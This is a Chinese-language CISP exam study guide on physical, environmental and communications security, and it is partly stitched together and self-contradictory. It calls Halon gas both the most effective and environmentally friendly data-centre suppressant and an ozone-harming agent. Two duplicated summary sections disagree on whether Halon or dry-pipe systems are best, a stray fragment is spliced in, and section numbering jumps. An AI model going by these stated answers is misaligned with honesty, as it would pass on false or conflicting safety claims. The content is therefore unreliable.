综合监控内容： 物理安全监控系统： ├── 视频监控 │ ├── 出入口监控 │ ├── 机房内部监控 │ ├── 周界监控 │ └── 录像存储（至少90天） ├── 入侵检测 │ ├── 门磁传感器 │ ├── 红外探测器 │ ├── 玻璃破碎探测器 │ └── 震动传感器 ├── 环境监控 │ ├── 温湿度监测 │ ├── 漏水检测 │ ├── 烟雾探测 │ └── 电力监测 └── 访问记录 ├── 门禁日志 ├── 访客记录 ├── 异常告警 └── 审计报告 4.2 监控数据管理 监控数据保留要求： 数据类型 保留期限 用途 视频录像 90天以上 事件调查、审计 门禁日志 1年以上 访问审计、合规 环境数据 1年以上 趋势分析、故障排查 告警记录 永久保存 安全分析、改进 五、物理访问控制增强 5.1 访问授权要求 所有进入物理安全区域的人员都需经过授权。 💡 授权是进入物理安全区域的前提关键概念： 所有进入物理安全区域的人员都需经过授权（Authorization）。 与其他概念的区别： ✅ 授权（Authorization） - 正确，赋予访问权限 ❌ 考核 - 不准确，是能力评估 ❌ 批准（Approval） - 接近但不够准确，更多指流程审批 ❌ 认可 - 不够正式和准确 授权流程： graph LR A[\"访问申请\"] --> B[\"身份验证\"] B --> C[\"授权审批\"] C --> D[\"权限分配\"] D --> E[\"访问执行\"] E --> F[\"访问记录\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#c8e6c9,stroke:#2e7d32 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 授权的重要性： 🔐 确保只有合法人员进入 📊 提供完整的审计跟踪 ⚠️ 防止未授权访问 🛡️ 支持事件调查 5.2 数据中心灭火系统选择 最佳灭火方法： 在数据中心灭火，哈龙气体（Halon） 是最有效并且环保的方法。 💡 哈龙气体是数据中心最佳选择为什么哈龙气体最适合数据中心： ✅ 不损坏设备 气体灭火，不导电 不会损坏电子设备 灭火后无残留 ✅ 灭火效果好 快速抑制火焰 适用于电气火灾 覆盖范围广 ⚠️ 环保考虑 传统哈龙对臭氧层有影响 现代替代品（如FM-200、七氟丙烷）更环保 但哈龙仍是数据中心的经典选择 灭火系统对比： 灭火方式 对设备影响 灭火效果 环保性 适用性 哈龙气体 ⭐⭐⭐⭐⭐ 无损 ⭐⭐⭐⭐⭐ 优秀 ⭐⭐⭐ 一般 ✅ 最佳 湿管系统 ⭐ 严重损坏 ⭐⭐⭐⭐ 好 ⭐⭐⭐⭐⭐ 好 ❌ 不适用 干管系统 ⭐⭐ 可能损坏 ⭐⭐⭐ 一般 ⭐⭐⭐⭐⭐ 好 ⚠️ 次选 二氧化碳 ⭐⭐⭐⭐ 较小 ⭐⭐⭐⭐ 好 ⭐⭐⭐⭐ 好 ⚠️ 可用 5.3 干管灭火系统 干管系统特点： 干管灭火器系统使用水，但是只有在发现火警以后水才进入管道。 graph TB A[\"干管系统\"] --> B[\"平时管道无水\"] A --> C[\"火警触发\"] C --> D[\"水进入管道\"] D --> E[\"喷水灭火\"] F[\"湿管系统\"] --> G[\"管道常有水\"] G --> H[\"火警触发\"] H --> I[\"立即喷水\"] style A fill:#e3f2fd,stroke:#1976d2 style F fill:#fff3e0,stroke:#f57c00 消防系统对比： 系统类型 管道状态 响应速度 适用场景 优势 干管系统 平时无水 较慢 数据中心 防止误喷、管道破裂不漏水 湿管系统 常有水 最快 一般建筑 响应迅速 气体灭火 无水 快 机房核心区 不损坏设备 💡 干管系统最适合数据中心为什么数据中心使用干管系统： 💧 防止误喷 平时管道无水 避免误触发造成损失 管道破裂不会漏水 ⚡ 电气安全 只在确认火警后才有水 减少电气设备受损风险 给予人员撤离时间 🛡️ 可控性强 可以手动控制 分区域控制 便于维护检查 5.4 电源保护 稳压电源的作用： 在数据中心使用稳压电源，以保证硬件免受电源浪涌。 电源问题类型： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_1607c80d2')); var option = { \"title\": { \"text\": \"电源问题对设备的影响\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"浪涌\", \"电压波动\", \"断电\", \"谐波干扰\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"危害程度\" }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 95, \"itemStyle\": {\"color\": \"#f44336\"}}, {\"value\": 70, \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 100, \"itemStyle\": {\"color\": \"#c62828\"}}, {\"value\": 60, \"itemStyle\": {\"color\": \"#ffc107\"}} ], \"label\": { \"show\": true, \"position\": \"top\" } }] }; chart.setOption(option); } })(); 电源保护措施： 问题类型 保护措施 作用 浪涌 稳压电源、浪涌保护器 保护硬件免受损坏 电压波动 稳压电源、UPS 提供稳定电压 断电 UPS、发电机 持续供电 谐波干扰 滤波器、隔离变压器 提供纯净电源 5.5 生物识别访问控制 物理访问控制方法对比： 方法 安全级别 便利性 成本 适用场景 指纹扫描器 ⭐⭐⭐⭐⭐ 最高 ⭐⭐⭐⭐ 高 高安全区域 电子门锁 ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 中 一般安全区域 Cipher密码锁 ⭐⭐⭐ ⭐⭐⭐ 低 低安全区域 门锁bolting ⭐⭐ ⭐⭐ 低 基础防护 💡 指纹扫描器提供最高安全级别为什么指纹扫描器最安全： 🔐 生物特征唯一性 👤 无法转让或复制 🚫 不会遗忘或丢失 📊 可记录详细审计日志 5.6 无线安全测试 测试办公部门无线安全的方法： 测试无线安全最有效的方法是使用战争驱车（War Driving） 技术。 无线安全测试方法： 方法 有效性 说明 战争驱车 ⭐⭐⭐⭐⭐ 模拟外部攻击，发现无线网络漏洞 无线扫描工具 ⭐⭐⭐⭐ 发现未授权接入点 渗透测试 ⭐⭐⭐⭐⭐ 全面评估无线安全 策略审查 ⭐⭐⭐ 检查配置和策略 💡 战争驱车（War Driving）什么是战争驱车： 🚗 驾车在办公区域周围 📡 使用无线扫描设备 🔍 发现可访问的无线网络 🛡️ 评估无线信号覆盖范围 ⚠️ 识别安全配置问题 5.7 电磁泄露风险 电磁泄露的危害： 来自终端的电磁泄露风险存在，因为它们可以被捕获并还原。 电磁泄露防护： 🛡️ 使用电磁屏蔽设备 📏 保持安全距离 🔒 使用TEMPEST认证设备 📡 实施电磁干扰 5.8 RFID安全 射频识别（RFID）标签风险： RFID标签容易受到窃听风险。 原因： 📡 无线电是广播式传播方式 🔓 信号可被远程截获 📶 难以控制传播范围 防护措施： 🔐 使用加密RFID标签 🛡️ 实施信号屏蔽 📏 限制读取距离 🔑 双因素认证 5.9 访客管理 数据中心访客控制： 对于参观者访问数据中心的最有效控制是陪同参观。 访客管理措施对比： 措施 有效性 说明 陪同参观 ⭐⭐⭐⭐⭐ 最有效 全程监控，实时干预 参观者佩戴证件 ⭐⭐⭐ 便于识别但无法防止违规 参观者签字 ⭐⭐ 仅有记录作用 工作人员抽样检查 ⭐⭐ 无法全程监控 💡 陪同参观最有效为什么陪同参观最有效： 👁️ 全程监控 实时观察访客行为 及时发现异常情况 防止未授权操作 🚫 即时干预 可以立即制止违规行为 回答访客疑问 引导访客路线 📋 责任明确 陪同人员承担监督责任 便于事后追溯 提供完整的访问记录 六、总结 物理与环境安全的核心要点： 选址合理：数据中心应选择中间楼层，避免地下室、一楼和顶楼 分层防护：实施多层物理访问控制，形成纵深防御 授权管理：所有进入物理安全区域的人员都需经过授权 消防安全：数据中心应使用哈龙气体或干管系统 电源保护：使用稳压电源保护硬件免受浪涌 生物识别：指纹扫描器提供最高级别的物理访问控制 电磁防护：防范电磁泄露风险 无线安全：定期进行无线安全测试 RFID安全：防范RFID标签窃听风险 访客管理：陪同参观是最有效的访客控制措施 🎯 关键要点 数据中心应选择中间楼层 所有人员进入物理安全区域需经过授权 哈龙气体是数据中心最有效的灭火方法 干管系统平时管道无水，火警后才进水 稳压电源保护硬件免受电源浪涌 指纹扫描器提供最高级别的访问控制 电磁泄露可被捕获并还原 战争驱车可测试无线安全 RFID标签容易受到窃听 陪同参观是最有效的访客控制 🚫 主动防护 可以立即制止违规行为 控制访问范围 解答疑问避免误操作 📋 灵活应对 根据情况调整路线 避开敏感区域 处理突发情况 六、总结 物理与环境安全的核心在于： 选址合理：中间楼层最适合数据中心 分层防护：建立多层物理访问控制 授权管理：所有人员进入需经过授权 环境控制：维持适宜的温湿度环境 电力保障：使用稳压电源保护硬件 消防安全：干管系统最适合数据中心 访问控制：指纹扫描器提供最高安全级别 访客管理：陪同参观是最有效的控制 持续监控：实施全面的物理安全监控 🎯 关键要点 数据中心应选择中间楼层，避开一楼、地下室和顶楼 所有进入物理安全区域的人员都需经过授权 干管灭火系统最适合数据中心（火警后水才进入管道） 稳压电源保证硬件免受电源浪涌 指纹扫描器对非授权访问提供最高级别安全 电磁泄露可以被捕获并还原 RFID标签容易受到窃听风险 陪同参观是访客访问数据中心的最有效控制 采用多层物理访问控制，形成纵深防御 维持适宜的温湿度环境（温度18-27°C，湿度40-60%） 💡 实践建议 定期进行物理安全评估 测试应急系统（UPS、发电机、消防） 审查访问日志，识别异常模式 培训员工物理安全意识 制定并演练应急预案","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：通信与操作安全","slug":"2025/10/CISP-Communications-Operations-Security-zh-CN","date":"un22fin22","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Communications-Operations-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Communications-Operations-Security/","excerpt":"深入解析CISP认证中的通信与操作安全知识点，涵盖介质销毁、网络协议、生物识别技术和网络拓扑结构。","text":"通信与操作安全是信息安全管理的重要组成部分，涉及数据传输、存储介质管理、网络架构和身份认证等多个方面。 一、信息安全管理关注重点 1.1 内部威胁 vs 外部威胁 信息安全管理需要平衡内外部威胁，但应更关注内部威胁。 威胁来源对比： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_84a5c37e3')); var option = { \"title\": { \"text\": \"安全威胁来源分析\" }, \"tooltip\": { \"trigger\": \"item\" }, \"legend\": { \"orient\": \"vertical\", \"left\": \"left\" }, \"series\": [{ \"type\": \"pie\", \"radius\": \"50%\", \"data\": [ {\"value\": 60, \"name\": \"内部恶意攻击\", \"itemStyle\": {\"color\": \"#f44336\"}}, {\"value\": 20, \"name\": \"外部恶意政击\", \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 15, \"name\": \"病毒影响\", \"itemStyle\": {\"color\": \"#ffc107\"}}, {\"value\": 5, \"name\": \"其他\", \"itemStyle\": {\"color\": \"#9e9e9e\"}} ], \"label\": { \"show\": true, \"formatter\": \"{b}: {d}%\" } }] }; chart.setOption(option); } })(); 🚨 内部恶意攻击是最大威胁为什么内部威胁更严重： 🔑 权限优势 内部人员拥有合法访问权限 了解系统架构和安全措施 可以绕过外部防护 🔍 难以检测 正常操作与恶意行为难以区分 可能长期潜伏不被发现 了解审计机制，更容易隐藏踪迹 📊 影响更大 可能造成更大损失 数据泄露风险高 业务中断风险大 威胁类型对比： 威胁类型 发生概率 影响程度 检测难度 管理重点 内部恶意攻击 低 极高 高 ⭐⭐⭐⭐⭐ 最高 外部恶意攻击 中 高 中 ⭐⭐⭐⭐ 高 病毒对PC影响 高 中 低 ⭐⭐⭐ 中 病毒对网络影响 中 高 中 ⭐⭐⭐⭐ 高 二、存储介质安全管理 1.1 磁介质销毁方法 当存储介质需要废弃或重新利用时，必须确保数据无法被恢复。 常见销毁方法对比： 方法 安全性 成本 可逆性 适用场景 删除 ⭐ 极低 低 可恢复 ❌ 不推荐用于敏感数据 格式化 ⭐⭐ 低 低 可恢复 ❌ 不推荐用于敏感数据 消磁 ⭐⭐⭐⭐ 高 中 不可恢复 ✅ 磁性介质 物理破坏 ⭐⭐⭐⭐⭐ 最高 中高 完全不可恢复 ✅ 所有介质 💡 最有效的销毁方法物理破坏是对磁介质最有效的销毁方法，包括： 🔨 物理粉碎 🔥 焚烧 🗜️ 压碎 ⚡ 熔化 物理破坏确保数据完全无法恢复，适用于所有类型的存储介质。 销毁方法详解： graph TB A[\"存储介质销毁\"] B[\"软件方法\"] C[\"物理方法\"] A --> B A --> C B --> B1[\"删除❌ 不安全\"] B --> B2[\"格式化❌ 不安全\"] B --> B3[\"数据覆写⚠️ 中等安全\"] C --> C1[\"消磁✅ 高安全\"] C --> C2[\"物理破坏✅ 最高安全\"] B1 --> B1A[\"仅删除文件索引数据仍在磁盘\"] B2 --> B2A[\"重建文件系统数据可恢复\"] B3 --> B3A[\"多次覆写耗时较长\"] C1 --> C1A[\"破坏磁性仅适用磁性介质\"] C2 --> C2A[\"完全破坏适用所有介质\"] style B1 fill:#ffebee,stroke:#c62828 style B2 fill:#ffebee,stroke:#c62828 style B3 fill:#fff3e0,stroke:#f57c00 style C1 fill:#e8f5e9,stroke:#388e3d style C2 fill:#c8e6c9,stroke:#2e7d32 ⚠️ 常见误区错误认知： ❌ 删除文件就安全了 ❌ 格式化硬盘就无法恢复 ❌ 消磁适用于所有存储介质 正确理解： ✅ 删除和格式化都可以通过工具恢复 ✅ 消磁仅适用于磁性介质（硬盘、磁带） ✅ SSD等固态存储需要物理破坏或专用擦除工具 ✅ 物理破坏是最可靠的方法 三、网络可用性提升 3.1 冗余技术 提高网络可用性的关键是实现各种冗余。 冗余类型对比： graph TB A[\"网络可用性提升\"] B[\"链路冗余\"] C[\"数据冗余\"] D[\"软件冗余\"] E[\"电源冗余\"] A --> B A --> C A --> D A --> E B --> B1[\"⭐⭐⭐⭐⭐ 最重要\"] B --> B2[\"多路由、双链路\"] B --> B3[\"防止单点故障\"] C --> C1[\"⭐⭐⭐⭐ 重要\"] C --> C2[\"RAID、备份\"] C --> C3[\"防止数据丢失\"] D --> D1[\"⭐⭐⭐ 一般\"] D --> D2[\"集群、负载均衡\"] D --> D3[\"提高服务可用性\"] E --> E1[\"⭐⭐⭐⭐ 重要\"] E --> E2[\"UPS、双路供电\"] E --> E3[\"保障持续供电\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 style E fill:#f3e5f5,stroke:#7b1fa2 💡 链路冗余最重要为什么链路冗余能最有效提高可用性： 🔗 直接影响连接 网络链路是数据传输的基础 单链路故障导致完全中断 冗余链路提供备用路径 ⚡ 快速切换 可实现自动故障切换 切换时间通常在秒级 对业务影响最小 📊 性能提升 可实现负载均衡 提高带宽利用率 增强网络容量 各类冗余实现方式： 冗余类型 实现方式 故障切换时间 成本 链路冗余 双链路、多路由、MPLS 秒级 高 数据冗余 RAID、镜像、备份 分钟-小时级 中 软件冗余 集群、负载均衡 秒-分钟级 中 电源冗余 UPS、双路供电、发电机 毫秒-秒级 中高 四、网络安全协议 4.1 TCP/IP安全协议层次 由于Internet安全问题日益突出，基于TCP/IP协议，相关组织和专家在协议的不同层次设计了相应的安全通信协议，用来保障网络各层次的安全。 TCP/IP各层的安全协议： graph TB subgraph 应用层[\"应用层 (Application Layer)\"] A1[\"HTTPS, FTPS, SMTPS, SSH\"] end subgraph 传输层[\"传输层 (Transport Layer)\"] A2[\"SSL/TLS\"] end subgraph 网络层[\"网络层 (Network Layer)\"] A3[\"IPSec\"] end subgraph 网络接口层[\"网络接口层 (Network Interface Layer)\"] A4[\"L2TP, PPTP, PPP\"] end 应用层 --> 传输层 传输层 --> 网络层 网络层 --> 网络接口层 style 应用层 fill:#e8eaf6,stroke:#3f51b5 style 传输层 fill:#c8e6c9,stroke:#2e7d32 style 网络层 fill:#e0f2f1,stroke:#009688 style 网络接口层 fill:#fff3e0,stroke:#ff9800 💡 SSL/TLS属于传输层为什么SSL/TLS属于传输层： ✅ 协议层次定位 SSL/TLS在TCP之上，应用层之下 为TCP连接提供加密和认证 依赖于传输层的可靠传输 🔒 安全功能 提供端到端加密 服务器身份认证 数据完整性保护 支持客户端认证（可选） 🎯 应用场景 HTTPS（HTTP over SSL/TLS） FTPS（FTP over SSL/TLS） SMTPS（SMTP over SSL/TLS） 其他需要安全通信的应用 各层安全协议详解： 层次 安全协议 主要功能 适用场景 应用层 HTTPS, SSH, SFTP 应用级加密和认证 Web访问、远程管理 传输层 SSL/TLS 端到端加密、身份认证 安全通信通道 网络层 IPSec IP层加密、认证 VPN、站点间加密 网络接口层 L2TP, PPTP 链路层隧道 拨号VPN、点对点连接 ⚠️ 其他选项分析为什么不是其他层次： ❌ PP2P（选项A） PP2P不是标准的安全协议 可能是指Point-to-Point Protocol（PPP） PPP属于网络接口层/数据链路层 ❌ L2TP（选项B） Layer 2 Tunneling Protocol 属于网络接口层/数据链路层 用于建立虚拟私有网隧道 ❌ IPSec（选项D） Internet Protocol Security 属于网络层（IP层） 提供IP数据包的加密和认证 4.2 无线局域网安全协议 WPA和WPA2的区别： Wi-Fi联盟提出了多个无线局域网安全协议，其中WPA和WPA2是两个重要的版本。 graph TB A[\"无线安全协议演进\"] B[\"WEP（已淘汰）\"] C[\"WPA（802.11i草案）\"] D[\"WPA2（802.11i正式标准）\"] E[\"WPA3（最新标准）\"] A --> B B --> C C --> D D --> E B --> B1[\"弱加密RC4\"] C --> C1[\"临时解决方案TKIP\"] D --> D1[\"正式标准AES-CCMP\"] E --> E1[\"增强安全SAE\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#fff3e0,stroke:#f57c00 style D fill:#c8e6c9,stroke:#2e7d32 style E fill:#e3f2fd,stroke:#1976d2 💡 WPA vs WPA2的核心区别正确答案：WPA是依照802.11i标准草案制定的，而WPA2是依照802.11i正式标准制定的 📝 WPA（Wi-Fi Protected Access） 2003年推出 基于802.11i标准的草案版本 作为WEP的临时替代方案 使用TKIP（Temporal Key Integrity Protocol）加密 支持RC4加密算法 ✅ WPA2（Wi-Fi Protected Access 2） 2004年推出 基于802.11i正式标准 完整实现802.11i标准 必须使用AES-CCMP加密 安全性更高，是当前主流 错误选项分析： 选项 说明 为什么错误 A. WPA是有线局域安全协议，WPA2是无线局域网协议 两者都是无线局域网协议 完全错误 B. WPA适用于中国，WPA2适用于全世界 两者都是国际标准 没有地域限制 C. WPA没有使用密码算法认证，WPA2使用了 两者都使用密码算法 WPA也使用加密 D. WPA依照802.11i草案，WPA2依照802.11i正式标准 正确描述 ✅ 正确答案 WPA/WPA2技术对比： 特性 WPA WPA2 WPA3 发布时间 2003年 2004年 2018年 标准基础 802.11i草案 802.11i正式标准 802.11-2016 加密算法 TKIP/AES AES-CCMP（必须） AES-GCMP-256 密钥管理 4-Way Handshake 4-Way Handshake SAE（Dragonfly） 安全性 中 高 非常高 当前状态 逐渐淘汰 主流使用 逐步普及 加密算法对比： 无线安全加密算法演进： ├── WEP │ ├── RC4流密码 │ ├── 40&#x2F;104位密钥 │ └── ❌ 已被破解，不安全 ├── WPA │ ├── TKIP（Temporal Key Integrity Protocol） │ ├── 仍使用RC4，但增强了密钥管理 │ └── ⚠️ 存在已知漏洞 ├── WPA2 │ ├── AES-CCMP（Counter Mode with CBC-MAC Protocol） │ ├── 128位密钥 │ └── ✅ 当前主流，安全性高 └── WPA3 ├── AES-GCMP-256（Galois&#x2F;Counter Mode Protocol） ├── 192位密钥（企业级） └── ✅ 最新标准，安全性最高 认证模式： 认证模式 WPA WPA2 WPA3 适用场景 Personal（PSK） 支持 支持 支持 家庭、小型办公室 Enterprise（802.1X） 支持 支持 支持 企业、大型组织 SAE（Dragonfly） 不支持 不支持 支持 WPA3新增 4.3 网络协议基础 4.3.1 TCP/IP协议模型 TCP/IP协议是互联网的基础协议栈，采用四层模型。 TCP/IP四层模型： graph TB subgraph 应用层[\"应用层 (Application Layer)\"] A1[\"HTTP, FTP, SMTP, DNS\"] end subgraph 传输层[\"传输层 (Transport Layer)\"] A2[\"TCP, UDP\"] end subgraph 网络层[\"网络层 (Network Layer)\"] A3[\"IP, ICMP, ARP\"] end subgraph 网络接口层[\"网络接口层 (Network Interface Layer)\"] A4[\"Ethernet, Wi-Fi, PPP\"] end 应用层 --> 传输层 传输层 --> 网络层 网络层 --> 网络接口层 style 应用层 fill:#e8eaf6,stroke:#3f51b5 style 传输层 fill:#f3e5f5,stroke:#9c27b0 style 网络层 fill:#e0f2f1,stroke:#009688 style 网络接口层 fill:#fff3e0,stroke:#ff9800 各层功能说明： 层次 功能 主要协议 示例 应用层 为应用程序提供网络服务 HTTP, FTP, SMTP, DNS 网页浏览、文件传输、邮件 传输层 提供端到端的数据传输 TCP, UDP 可靠传输、快速传输 网络层 路由和寻址 IP, ICMP, ARP IP地址、路由选择 网络接口层 物理网络访问 Ethernet, Wi-Fi 网卡驱动、物理连接 💡 TCP/IP vs OSI模型TCP/IP四层模型： 应用层 传输层 网络层 网络接口层 OSI七层模型： 应用层 表示层 会话层 传输层 网络层 数据链路层 物理层 TCP/IP模型更简洁实用，是互联网的实际标准。 五、生物识别技术 3.1 生物识别技术对比 生物识别技术可以替代传统的密码和PIN码，提供更安全便捷的身份认证。 常见生物识别技术： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_3119d515e')); var option = { \"title\": { \"text\": \"生物识别技术安全性对比\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"安全性\", \"便利性\", \"成本\"] }, \"radar\": { \"indicator\": [ {\"name\": \"虹膜识别\", \"max\": 100}, {\"name\": \"指纹识别\", \"max\": 100}, {\"name\": \"面部识别\", \"max\": 100}, {\"name\": \"语音识别\", \"max\": 100}, {\"name\": \"笔迹识别\", \"max\": 100} ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [95, 85, 75, 70, 65], \"name\": \"安全性\" }, { \"value\": [70, 90, 85, 80, 60], \"name\": \"便利性\" }, { \"value\": [40, 70, 65, 75, 70], \"name\": \"成本\" } ] }] }; chart.setOption(option); } })(); 各技术特点： 技术 安全性 便利性 成本 适用场景 虹膜识别 ⭐⭐⭐⭐⭐ ⭐⭐⭐ 高 高安全场所、边境检查 指纹识别 ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 中 手机解锁、门禁系统 面部识别 ⭐⭐⭐⭐ ⭐⭐⭐⭐ 中 手机解锁、监控系统 语音识别 ⭐⭐⭐ ⭐⭐⭐⭐ 中 电话银行、语音助手 笔迹识别 ⭐⭐⭐ ⭐⭐⭐ 中 签名验证、文档认证 💡 虹膜识别的优势为什么虹膜识别最适合替代PIN码： ✅ 极高的唯一性 每个人的虹膜纹理独一无二 即使双胞胎的虹膜也不相同 左右眼虹膜也不相同 ✅ 稳定性强 虹膜在人的一生中基本不变 不受年龄、疾病影响 难以伪造或复制 ✅ 非接触式 无需物理接触 卫生便捷 适合高流量场景 3.2 生物识别技术的安全考虑 优势： 🔐 难以伪造和盗用 👤 与个人绑定，无法转让 🚫 不会遗忘或丢失 ⚡ 认证速度快 挑战： 💰 实施成本较高 🔧 需要专用硬件设备 🌡️ 可能受环境因素影响 ⚖️ 隐私保护问题 🔄 生物特征泄露后无法更换 六、网络拓扑结构 4.1 常见网络拓扑 网络拓扑结构决定了网络的可靠性、性能和故障影响范围。 星型拓扑： graph TB C[\"中心交换机\"] A[\"终端A\"] B[\"终端B\"] D[\"终端D\"] E[\"终端E\"] F[\"终端F\"] A --> C B --> C C --> D C --> E C --> F style C fill:#4caf50,stroke:#2e7d32 style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e3f2fd,stroke:#1976d2 style D fill:#e3f2fd,stroke:#1976d2 style E fill:#e3f2fd,stroke:#1976d2 style F fill:#e3f2fd,stroke:#1976d2 星型拓扑特点： ✅ 优点： 单个链路故障只影响对应终端 易于管理和维护 易于扩展 故障隔离性好 ❌ 缺点： 中心节点故障导致整个网络瘫痪 需要更多线缆 中心设备成本较高 💡 星型拓扑的故障隔离&quot;如果一条链路发生故障，那么只有和该链路相连的终端才会受到影响&quot; 这一特性使得星型拓扑成为最常用的网络结构： 单个终端故障不影响其他终端 易于定位和修复故障 适合办公网络和数据中心 其他拓扑结构对比： 拓扑类型 故障影响 成本 扩展性 适用场景 星型 单点故障 中 好 办公网络、数据中心 环型 链路断开影响全网 低 差 令牌环网络（已淘汰） 总线型 主干故障影响全网 低 差 早期以太网（已淘汰） 网状型 冗余路径，影响小 高 好 核心网络、互联网骨干 七、信息安全部门技能要求 5.1 关键技能 信息系统安全部门员工需要具备多方面的技能才能有效完成工作。 技能重要性排序： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_7a1e9bf4e')); var option = { \"title\": { \"text\": \"信息安全部门员工技能重要性\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"技术技能\", \"人际关系技能\", \"项目管理技能\", \"沟通技能\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"重要性\", \"max\": 100 }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 85, \"itemStyle\": {\"color\": \"#2196f3\"}}, {\"value\": 75, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 70, \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 95, \"itemStyle\": {\"color\": \"#f44336\"}} ], \"label\": { \"show\": true, \"position\": \"top\" } }] }; chart.setOption(option); } })(); 💡 沟通技能最重要为什么沟通技能最关键： 🗣️ 跨部门协作 需要与业务部门沟通安全需求 向管理层汇报安全状况 协调各部门配合安全工作 📢 安全意识推广 向员工传达安全政策 进行安全培训 解释安全措施的必要性 🤝 外部沟通 与供应商、合作伙伴沟通 应对安全事件时的对外沟通 与监管机构的沟通 ⚠️ 事件响应 清晰传达事件信息 协调应急响应 向利益相关方通报 各技能的作用： 技能类型 主要作用 应用场景 沟通技能 信息传递、协调合作 日常工作、事件响应、培训 技术技能 实施安全措施、分析威胁 技术实施、漏洞分析 人际关系技能 建立信任、推动合作 跨部门协作、团队建设 项目管理技能 规划执行、资源协调 安全项目实施、改进计划 八、应用安全与系统维护 8.1 错误信息处理 错误信息最小化的重要性： 在检查公司对外服务网站的源代码时，发现程序在发生诸如没有找到资源、数据库连接错误、写临时文件错误等问题时，会将详细的错误原因在结果页面上显示出来。从安全角度考虑，应该修改代码，将详细的错误原因都隐藏起来，在页面上仅仅告知用户&quot;抱歉，发生内部错误！&quot; 答案：最小化反馈信息 graph TB A[\"系统错误发生\"] B[\"❌ 错误做法显示详细错误\"] C[\"✅ 正确做法最小化反馈\"] A --> B A --> C B --> B1[\"数据库连接字符串\"] B --> B2[\"文件路径信息\"] B --> B3[\"系统版本信息\"] B --> B4[\"堆栈跟踪信息\"] C --> C1[\"抱歉，发生内部错误\"] C --> C2[\"记录详细日志\"] C --> C3[\"通知管理员\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 🚨 详细错误信息的安全风险为什么要最小化反馈信息： 🔍 信息泄露风险 详细错误信息可能泄露系统架构 暴露数据库结构和表名 显示文件路径和目录结构 揭示使用的技术栈和版本 🎯 攻击者利用 攻击者可以利用这些信息进行针对性攻击 了解系统弱点和漏洞 制定更有效的攻击策略 绕过安全防护措施 ✅ 正确的处理方式 向用户显示通用错误消息 详细错误记录在服务器日志中 仅管理员可以查看详细日志 实施适当的日志保护措施 错误处理对比： 处理方式 用户看到的信息 安全性 可维护性 详细错误显示 数据库连接失败：用户名’admin’@'192.168.1.100’访问被拒绝 ❌ 低 🟡 中 最小化反馈 抱歉，发生内部错误！ ✅ 高 ✅ 高 错误代码 错误代码：E1001 🟡 中 ✅ 高 最佳实践： 错误处理最佳实践： ├── 前端显示 │ ├── 通用错误消息 │ ├── 友好的用户提示 │ ├── 错误代码（可选） │ └── 联系支持方式 ├── 后端日志 │ ├── 详细错误信息 │ ├── 堆栈跟踪 │ ├── 时间戳 │ ├── 用户标识 │ └── 请求参数 ├── 日志保护 │ ├── 访问控制 │ ├── 加密存储 │ ├── 定期归档 │ └── 安全审计 └── 监控告警 ├── 错误频率监控 ├── 异常模式检测 ├── 自动告警 └── 及时响应 💡 其他选项分析为什么不是其他选项： ❌ 避免缓冲区溢出 缓冲区溢出是内存管理问题 与错误信息显示无关 需要通过输入验证和边界检查防范 ❌ 安全处理系统异常 这是更广泛的概念 隐藏错误信息只是其中一部分 重点是信息显示问题 ❌ 安全使用临时文件 临时文件安全是独立的安全问题 与错误信息显示无直接关系 需要通过权限控制和安全删除实现 8.2 应急演练的重要性 应急演练工作的必要性： 某IT公司针对信息安全事件已经建立了完善的预案，在年度企业信息安全总结会上，信息安全管理员对今年应急预案工作做出了四个总结。其中存在问题的是： 错误总结：公司自身拥有优势的技术人员，系统也是自己开发的，无需进行应急演练工作，因此今年仅制定了应急演练相关流程及文档，为了不影响业务，应急演练工作不举行 graph TB A[\"应急预案管理\"] B[\"✅ 正确做法\"] C[\"❌ 错误做法\"] A --> B A --> C B --> B1[\"制定完善流程\"] B --> B2[\"定期演练\"] B --> B3[\"持续改进\"] B --> B4[\"符合标准\"] C --> C1[\"仅制定文档\"] C --> C2[\"不进行演练\"] C --> C3[\"理由：技术优势\"] C --> C4[\"理由：不影响业务\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 🚨 不进行应急演练的风险为什么必须进行应急演练： 📋 验证计划有效性 纸面计划可能存在缺陷 实际执行中可能遇到问题 演练可以发现计划中的不足 及时调整和改进预案 👥 提升团队能力 熟悉应急响应流程 明确各自职责分工 提高协作配合能力 